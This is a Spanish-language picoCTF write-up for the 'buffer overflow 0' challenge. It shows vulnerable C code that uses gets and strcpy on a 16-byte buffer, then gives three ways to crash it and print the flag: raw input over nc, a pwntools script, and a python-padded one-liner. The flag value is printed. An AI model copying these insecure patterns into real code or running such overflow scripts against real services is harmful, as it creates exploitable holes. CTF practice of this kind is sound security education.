## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/172/vuln). You can view source [here](https://artifacts.picoctf.net/c/172/vuln.c). Connect using: `nc saturn.picoctf.net 58938`
## Solución

```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ ls
vuln  vuln.c

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ nano vuln.c            
```
- Revisamos el código del programa que nos dan.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
- Observamos que la variable buf2 copia mas de lo que puede, y el lector trata de guardar algo mas grande de lo que puede, por lo tanto se provoca un desborde.
- A partir de aquí podemos obtener la bandera de 3 formas diferentes.
### Opción 1
- Ingresamos un largo texto para que se desborde.
```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ nc saturn.picoctf.net 58938
Input: anjnokanfoknfknjonaofnofnonaoagngajsnfej
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ 
```

### Opción 2
- Creamos un ejecutivo en Python 
```python
from pwn import *
#p = process()
p =remote('saturn.picoctf.net', 58938)
print(p.recv().decode())

overflow = b'E'*20

p.sendline(overflow)
print(p.recvall().decode())
p.close()
```
- Y ya solo lo ejecutamos.
```
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ python3 solve.py
[+] Opening connection to saturn.picoctf.net on port 54341: Done
Input: 
[+] Receiving all data: Done (43B)
[*] Closed connection to saturn.picoctf.net port 54341
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ 

```

### Opción 3
- Le enviamos una función que envié un texto largo.
```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ nc saturn.picoctf.net 58938 <<< $(python3 -c "print('I'*20)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/bufferoverflow0]
└─$ 

```

## Notas Adicionales
## Referencias
